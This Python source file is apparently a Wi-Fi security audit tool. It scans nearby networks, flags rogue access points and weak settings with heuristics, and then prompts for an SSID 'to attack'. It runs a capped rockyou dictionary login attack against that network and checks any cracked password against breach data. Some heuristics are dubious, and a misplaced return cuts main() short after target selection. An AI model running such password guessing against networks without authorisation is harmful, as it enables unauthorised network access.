import os
import time
import socket
# import platform
import pandas as pd
import concurrent.futures
import subprocess
import re
import random
import string
import hashlib
import requests
from tabulate import tabulate


DEFAULT_WORDLIST_LINUX = "/home/autosecure/wifi/rockyou1.txt"


try:
    import scapy.all as scapy
except ImportError:
    scapy = None


def get_active_wireless_interface():
    # output = os.popen("nmcli device status").read()
    # for line in output.splitlines():
    # if "wifi" in line and "connected" in line:
    # return line.split()[0]  # returns wlan0 or wlan1
    return "wlan1"


# Function to check if a tool is installed
def is_tool_installed(tool):
    return os.system(f"command -v {tool} > /dev/null 2>&1") == 0

# Function to clean and fix BSSID formatting


def clean_bssid(bssid):
    return bssid.replace("\\", "").strip()


def get_channel_for_network(ssid, bssid):
    output = os.popen("nmcli -f SSID,BSSID,CHAN device wifi list").read()
    lines = output.strip().split("\n")

    for line in lines:
        parts = re.split(r'(?<!\\):', line.strip())
        if len(parts) == 3:
            scanned_ssid, scanned_bssid, channel = parts
            if scanned_ssid == ssid and scanned_bssid.lower() == bssid.lower():
                return channel.strip()
    return "Unknown"


# ----------------rouge----------------------------------#
def detect_rogue_access_points(networks_df):
    print("\n[+] Checking for Rogue Access Points (Deep Analysis)...\n")

    rogue_aps = []
    ssid_groups = networks_df.groupby("SSID")
    all_blocks = []

    for ssid, group in ssid_groups:
        bssids = group["BSSID"]
        encryption_set = set(group["Encryption Type"])
        signal_values = group["Signal Strength"].apply(
            lambda x: int(x.replace(" dBm", "")))

        # Calculate signal range
        max_signal = signal_values.max()
        min_signal = signal_values.min()
        signal_range = max_signal - min_signal
        signal_variation_text = f"📶 Signal Strength Range Detected: {max_signal} dBm to {min_signal} dBm"

        # 🧠 Detection logic
        rogue_reasons = set()
        severity_level = "Low"

        if len(group) > 1:
            if len(encryption_set) > 1:
                rogue_reasons.add("Mixed Encryption Types")
                severity_level = "Medium"
            if signal_range > 20:
                if signal_range > 35:
                    rogue_reasons.add(
                        f"🚨 High Signal Strength Difference Detected ({max_signal} dBm to {min_signal} dBm)")
                    severity_level = "High"
                else:
                    rogue_reasons.add(
                        f"Signal Strength Variation ({max_signal} dBm to {min_signal} dBm)")
                    severity_level = "Medium"
        if bssids.duplicated().any():
            rogue_reasons.add("Duplicate BSSID")
            severity_level = "High"

        # MAC spoofing detection (same prefix reuse)
        suspicious_mac_prefixes = [bssid[:8] for bssid in bssids]
        if len(set(suspicious_mac_prefixes)) == 1 and len(group) > 1 and len(encryption_set) == 1:
            rogue_reasons.add(
                "⚠️ This may be a fake AP copying a real one (same MAC prefix)")
            severity_level = "High"

        # Build output block
        block_lines = []
        block_lines.append(
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        block_lines.append(f"🔍 SSID: {ssid}\n")

        for _, row in group.iterrows():
            bssid = row["BSSID"]
            encryption = row["Encryption Type"]
            signal = row["Signal Strength"]

            block_lines.append(f"    ➤ BSSID: {bssid}")
            block_lines.append(f"       Signal: {signal}")
            block_lines.append(f"       Encryption: {encryption}")

        # Always show signal strength range
        block_lines.append(f"\n{signal_variation_text}")

        # Append detection results
        if rogue_reasons:
            block_lines.append("\n⚠️  Issues Detected:")
            for reason in rogue_reasons:
                block_lines.append(f"    - {reason}")
            block_lines.append(f"\n❌ Status: Likely Rogue AP Detected")
            if severity_level == "High":
                block_lines.append("🔴 Severity: High")
            elif severity_level == "Medium":
                block_lines.append("🟡 Severity: Medium")
            else:
                block_lines.append("🟢 Severity: Low")
        else:
            block_lines.append("✅ Status: Clean — No Rogue Indicators")
            block_lines.append("🟢 Severity: Low")

        block_lines.append(
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        print("\n".join(block_lines))
        all_blocks.append("\n".join(block_lines))

        # Save for final DataFrame
        rogue_aps.append([
            ssid,
            list(bssids),
            ", ".join(rogue_reasons) if rogue_reasons else "No issues",
            "❌ Likely Rogue" if rogue_reasons else "✅ Legit",
            severity_level
        ])

    df_rogue = pd.DataFrame(
        rogue_aps,
        columns=["SSID", "BSSIDs", "Rogue Indicators", "Status", "Severity"]
    )

    vulnerable_ssids = df_rogue[df_rogue["Status"]
                                == "❌ Likely Rogue"]["SSID"].unique()
    if len(vulnerable_ssids) > 0:
        print("\n🔍 Summary of Vulnerable SSIDs Detected:\n")
        for ssid in vulnerable_ssids:
            print(
                f"🚨 SSID '{ssid}' has rogue characteristics — may be spoofed or misconfigured.")
    else:
        print("✅ All SSIDs analyzed appear clean — no rogue activity detected.\n")

    return df_rogue


def analyze_network_vulnerabilities(networks_df):
    print("\n[+] Analyzing Wi-Fi Vulnerabilities...\n")

    vulnerabilities = []
    default_ssids = ["TP-LINK_", "DLink-", "NETGEAR",
                     "Tenda", "Linksys", "ASUS", "Belkin"]

    for index, row in networks_df.iterrows():
        encryption = row["Encryption Type"]
        ssid = row["SSID"]
        bssid = row["BSSID"]
        signal_strength = int(row["Signal Strength"].replace(" dBm", ""))
        risk_list = []

        # 🔐 Encryption analysis
        if "WEP" in encryption:
            risk_list.append("❌ High Risk: WEP Encryption (Easily Crackable)")
        elif "Open" in encryption:
            risk_list.append("❌ High Risk: Open Network (No Encryption)")
        elif "WPA1" in encryption:
            if "WPA2" in encryption:
                risk_list.append(
                    "⚠️ Medium Risk: WPA1/WPA2 Mixed Mode (Downgrade Attack Possible)")
            else:
                risk_list.append(
                    "❌ High Risk: WPA1 Only (Obsolete Encryption)")
        else:
            risk_list.append("✅ Secure (WPA2/WPA3)")

        # 📶 Signal strength check
        if signal_strength >= 85:
            risk_list.append(
                "🔴 Very Strong Signal (>85 dBm) — highly exploitable remotely")
        elif signal_strength >= 75:
            risk_list.append(
                "⚠️ Strong Signal (>75 dBm) — may be exploitable from distance")
        elif signal_strength <= 30:
            risk_list.append(
                "⚠️ Weak Signal (<30 dBm) — may indicate distant rogue AP")

        # 📛 Default SSID check
        if any(ssid.startswith(default) for default in default_ssids):
            risk_list.append(
                "❌ Default SSID Detected — weak or unchanged configuration")

        # 🔢 SSID entropy checks
        if len(ssid) < 4:
            risk_list.append("⚠️ Short SSID — easily guessable")
        if not re.search(r"\d", ssid):
            risk_list.append(
                "⚠️ No Numbers in SSID — may indicate factory default")

        # 🎭 Suspicious BSSID format
        if bssid.endswith(":00") or bssid.startswith("00:00"):
            risk_list.append(
                "⚠️ Suspicious BSSID Format — may be spoofed or misconfigured")
        # 🚨 Vendor-based Weaknesses
        exploit_prone_vendors = ["TP-LINK",
                                 "DLink", "Tenda", "Zyxel", "Ubiquiti"]
        if any(v.lower() in ssid.lower() for v in exploit_prone_vendors):
            risk_list.append(
                "❌ Vendor has known CVEs — review firmware and patch status")

        # 📶 SSID Clone Detection
        if (networks_df["SSID"] == ssid).sum() > 3:
            risk_list.append(
                "🚨 SSID seen in >3 APs — possible Beacon Flood or SSID Cloning")

        # 🔓 Default SSID with weak signal
        if ssid.lower() in ["homewifi", "guest", "default", "admin"]:
            risk_list.append(
                "❌ Common SSID — likely to have weak/default password")

        # 🛑 Suspicious BSSID format
        if bssid.endswith(":00") or bssid.startswith("00:00"):
            risk_list.append("⚠️ Suspicious BSSID Format — may be spoofed")
        if "Open" in encryption and signal_strength <= 25:
            risk_list.append(
                "🚨 Open network with weak signal — likely bait AP for sniffing")

        # 💬 Add known weak naming patterns
        if re.search(r"1234|abcd|test|demo", ssid.lower()):
            risk_list.append(
                "⚠️ Weak naming pattern in SSID — predictable or lazy configuration")

        # Compile result
        risk_text = "\n".join(risk_list)
        vulnerabilities.append([
            ssid,
            bssid,
            encryption,
            row["Signal Strength"],
            risk_text
        ])

    df_vuln = pd.DataFrame(vulnerabilities, columns=[
                           "SSID", "BSSID", "Encryption Type", "Signal Strength", "Risk Analysis"])
    print(tabulate(df_vuln, headers="keys", tablefmt="grid",
          stralign="left", maxcolwidths=[20, 20, 15, 12, 40]))
    return df_vuln


# Function to scan Wi-Fi networks using nmcli
def scan_wifi_networks_nmcli():
    if not is_tool_installed("nmcli"):
        print("[-] nmcli not found. Skipping nmcli scan.")
        return None

    print("\n[+] Scanning for Wi-Fi networks using nmcli...")
    scan_output = os.popen(
        "nmcli -t -f SSID,BSSID,SIGNAL,SECURITY device wifi list").read().strip()
    networks = []

    for line in scan_output.split("\n"):
        if line.strip():
            parts = re.split(r'(?<!\\):', line)
            if len(parts) < 4:
                continue
            ssid = parts[0] if parts[0] else "Hidden SSID"
            bssid = clean_bssid(parts[1])
            signal = parts[2] + " dBm"
            encryption = parts[3]
            networks.append([ssid, bssid, signal, encryption])

    if not networks:
        print("[-] No Wi-Fi networks found.")
        return None

    df = pd.DataFrame(networks, columns=[
                      "SSID", "BSSID", "Signal Strength", "Encryption Type"])
    print(tabulate(df, headers="keys", tablefmt="grid", stralign="left"))
    return df


# ------------------------ Wi-Fi SCAN ------------------------
def scan_wifi_networks():
    print("[+] Scanning Wi-Fi networks (Linux)...")
    interface = get_active_wireless_interface()
    if not interface:
        print("[-] No active Wi-Fi interface found (e.g., wlan0).")
        print("    ➤ Please connect a Wi-Fi adapter or ensure it's up.")
        return pd.DataFrame()

    output = os.popen(
        f"nmcli -f SSID,BSSID,SIGNAL,SECURITY device wifi list ifname {interface}").read()
    lines = output.strip().split("\n")[1:]
    networks = []
    for line in lines:
        parts = line.split()
        if len(parts) < 3:
            continue
        ssid = parts[0]
        bssid = parts[1]
        signal = parts[2]
        enc = parts[3] if len(parts) > 3 else "Open"
        networks.append((ssid, bssid, "-", signal, enc))

    df = pd.DataFrame(networks, columns=[
                      "SSID", "BSSID", "Channel", "Signal Strength", "Encryption Type"])

    if df.empty:
        print("[-] No Wi-Fi networks found.")
    else:
        print(df.to_string(index=False))
    return df


def connect_to_network(ssid, password, delay=6):
    interface = get_active_wireless_interface()
    if not interface:
        print("[-] No active Wi-Fi interface found.")
        return False

    profile = "autoprof_" + \
        ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

    try:
        os.system(
            f"nmcli connection add type wifi con-name {profile} ifname {interface} ssid \"{ssid}\" > /dev/null 2>&1")
        os.system(
            f"nmcli connection modify {profile} wifi-sec.key-mgmt wpa-psk")
        os.system(
            f"nmcli connection modify {profile} wifi-sec.psk \"{password}\"")
        os.system(f"nmcli connection up {profile} > /dev/null 2>&1")
        time.sleep(delay)

        state = os.popen(
            f"nmcli -t -f GENERAL.STATE connection show {profile}").read().strip()
        if "100" in state or "activated" in state:
            print(
                f"[🟢] ✅ Credentials Found → SSID: {ssid} | Password: {password}")
            os.system(f"nmcli connection delete {profile} > /dev/null 2>&1")
            return True
        else:
            os.system(f"nmcli connection delete {profile} > /dev/null 2>&1")
    except Exception as e:
        print(f"[-] Error: {e}")

    return False


# ------------------------ PASSWORD CRACK ------------------------
def crack_wifi_password(ssid, wordlist=None, A=5):
    if not wordlist:
        wordlist = DEFAULT_WORDLIST_LINUX
    wordlist = os.path.expandvars(wordlist)

    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        return None

    print(f"[🔐] Starting password cracking on '{ssid}' ...\n")

    with open(wordlist, "r", encoding="latin-1") as file:
        for i, password in enumerate(file):
            if i >= A:
                print("[-] Reached maximum attempt limit.")
                break

            password = password.strip()
            if len(password) < 8 or len(password) > 63:
                continue  # skip invalid lengths

            # print(f"[*] Trying: {password}")
            if connect_to_network(ssid, password, delay=2):  # ⏱️ faster mode
                print(f"\n--- Analyzing cracked password: {password} ---")
                pwned_result = check_pwned_password(password)
                strength_issues = password_strength_feedback(password)
                suggestion = generate_strong_password()
                print("---------------------------------------------")
                # Return structured dictionary
                return {
                    'password': password,
                    'analysis': {
                        'pwned_count': pwned_result["pwned_count"],
                        'pwned_error': pwned_result["pwned_error"],
                        'strength_issues': strength_issues,
                        'suggestion': suggestion
                    }
                }

    print("[-] No credentials found in top entries.")
    return None


# --- Password Analysis Functions --- #

# Check if password is leaked using HIBP API
def check_pwned_password(password):
    analysis = {"pwned_count": 0, "pwned_error": None}
    try:
        sha1_hash = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
        prefix = sha1_hash[:5]
        suffix = sha1_hash[5:]

        url = f"https://api.pwnedpasswords.com/range/{prefix}"
        res = requests.get(url, timeout=5)  # Added timeout

        if res.status_code != 200:
            print(
                f"❌ Error querying the HIBP API (Status: {res.status_code}).")
            analysis["pwned_error"] = f"HIBP API Error (Status: {res.status_code})"
            return analysis

        found = False
        for line in res.text.splitlines():
            hash_suffix, count_str = line.split(":")
            if hash_suffix == suffix:
                count = int(count_str)
                print(f"⚠️ Password LEAKED {count} times!")
                analysis["pwned_count"] = count
                found = True
                break

        if not found:
            print("✅ Password not found in known breaches.")
            analysis["pwned_count"] = 0

    except requests.exceptions.RequestException as e:
        print(f"❌ Network error checking HIBP: {e}")
        analysis["pwned_error"] = "Network error during HIBP check."
    except Exception as e:
        print(f"❌ Unexpected error during HIBP check: {e}")
        analysis["pwned_error"] = "Unexpected error during HIBP check."

    return analysis

# Local password strength checker


def password_strength_feedback(password):
    issues = []
    if len(password) < 8:
        issues.append("Too short (<8 characters)")
    if not re.search(r'[A-Z]', password):
        issues.append("No uppercase letters")
    if not re.search(r'[a-z]', password):
        issues.append("No lowercase letters")
    if not re.search(r'[0-9]', password):
        issues.append("No numbers")
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        issues.append("No special characters")

    if issues:
        print("\n❌ Weak Password Detected:", ", ".join(issues))
    else:
        print("\n✅ Password strength is good.")
    return issues

# Suggest a strong password


def generate_strong_password(length=12):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    strong_pass = ''.join(random.choice(chars) for _ in range(length))
    print("\n🔐 Suggested Strong Password:", strong_pass)
    return strong_pass

# --- End Password Analysis Functions --- #

# --- Helper Function for Rogue Data Formatting ---


def process_rogue_data_for_json(rogue_df):
    """Formats the rogue AP DataFrame into a dict for JSON response."""
    summary_list = []
    detailed_log_lines = []
    detailed_log_lines.append("📄 Rogue Access Point Detection Report\n")

    if rogue_df is None or rogue_df.empty:
        detailed_log_lines.append("✅ No rogue APs detected or scan failed.")
        return {"summary": [], "detailed_log": "\n".join(detailed_log_lines)}

    for index, row in rogue_df.iterrows():
        summary_list.append({
            "SSID": row['SSID'],
            "Status": row['Status'],
            "Severity": row['Severity'],
            "Rogue Indicators": row['Rogue Indicators']
        })

        # Reconstruct detailed log entry for this SSID
        detailed_log_lines.append("\n" + "\u2550" * 60)  # Top border
        detailed_log_lines.append(f"🔍 SSID: {row['SSID']}\n")
        if isinstance(row['BSSIDs'], list):
            for bssid in row['BSSIDs']:
                detailed_log_lines.append(f"    ➤ BSSID: {bssid}")
        else:
            detailed_log_lines.append(
                f"    ➤ BSSIDs: {row['BSSIDs']}")  # Fallback

        # Try to get signal/encryption info if available (might require joining data earlier)
        # Placeholder logic - this info isn't typically in the rogue_df as structured
        # detailed_log_lines.append(f"       Signal: {row.get('Signal Strength', 'N/A')}")
        # detailed_log_lines.append(f"       Encryption: {row.get('Encryption Type', 'N/A')}")

        detailed_log_lines.append(f"\nStatus: {row['Status']}")
        detailed_log_lines.append(f"Severity: {row['Severity']}")
        detailed_log_lines.append(f"Indicators: {row['Rogue Indicators']}")
        detailed_log_lines.append("\u2550" * 60 + "\n")  # Bottom border

    return {
        "summary": summary_list,
        "detailed_log": "\n".join(detailed_log_lines)
    }
# --- End Helper Function ---


def main():
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"target_summary_{timestamp}.txt"

    with open(filename, "w") as f:

        # ---------- SCAN NETWORKS ----------
        networks_df = scan_wifi_networks_nmcli()
        if networks_df is None or networks_df.empty:
            print("[-] No Wi-Fi networks found.")
            f.write("[-] No Wi-Fi networks found.\n")
            return

        f.write("📡 Available Wi-Fi Networks:\n")
        f.write(tabulate(networks_df, headers="keys",
                tablefmt="grid", stralign="left"))
        f.write("\n\n")

        # ---------- ROGUE AP DETECTION ----------
        f.write("🔍 Rogue Access Point Detection:\n")
        rogue_output = []
        original_print = print
        try:
            def capture_print(*args, **kwargs):
                line = " ".join(str(arg) for arg in args)
                rogue_output.append(line)
                original_print(*args, **kwargs)

            globals()['print'] = capture_print
            detect_rogue_access_points(networks_df)
        finally:
            globals()['print'] = original_print

        f.write("\n".join(rogue_output))
        f.write("\n\n")

        # ---------- SELECT TARGET ----------
        print("\nAvailable Networks:")
        for i, row in networks_df.iterrows():
            print(
                f"[{i}] {row['SSID']}  |  Signal: {row['Signal Strength']}  |  Security: {row['Encryption Type']}")
        try:
            index = int(
                input("\nEnter the number of the SSID to attack: ").strip())
            row = networks_df.iloc[index]
        except (ValueError, IndexError):
            print("[-] Invalid selection.")
        return

        ssid = row["SSID"]
        bssid = row["BSSID"]
        encryption = row["Encryption Type"]
        signal_strength = row["Signal Strength"]

        f.write("🎯 Selected Target:\n")
        f.write(f"➤ SSID       : {ssid}\n")
        f.write(f"➤ BSSID      : {bssid}\n")
        f.write(f"➤ Signal     : {signal_strength}\n")
        f.write(f"➤ Encryption : {encryption}\n\n")

        # ---------- VULNERABILITY ANALYSIS ----------
        print(
            f"\n[+] Selected Target: {ssid} {signal_strength} ({encryption})")
        risk_df = analyze_network_vulnerabilities(pd.DataFrame([row]))
        risk_summary = risk_df["Risk Analysis"].values[0]
        f.write("🛡️ Risk Analysis:\n")
        for line in risk_summary.split("\n"):
            f.write(f" - {line}\n")
        f.write("\n")

        # ---------- PASSWORD CRACK ----------
        password = crack_wifi_password(ssid, A=5)
        if password:
            f.write(f"✅ Password Cracked: {password}\n\n")
            f.write("⚠️ Credential-Based Vulnerabilities Identified:\n")
            f.write(
                " - 🔓 Weak or Guessable Wi-Fi Password — can be cracked via dictionary attacks\n")
            f.write(" - 🎯 Allows Unauthorized Network Access to Internal Devices\n")
            f.write(
                " - 🔑 Risk of Router Admin Panel Hijack if default credentials are reused\n")
            f.write(
                " - 🧠 User awareness or router security misconfiguration suspected\n\n")
        else:
            f.write("❌ Password cracking failed.\n\n")

    print(f"[💾] Full target report saved to: {filename}")


if __name__ == "__main__":
    main()
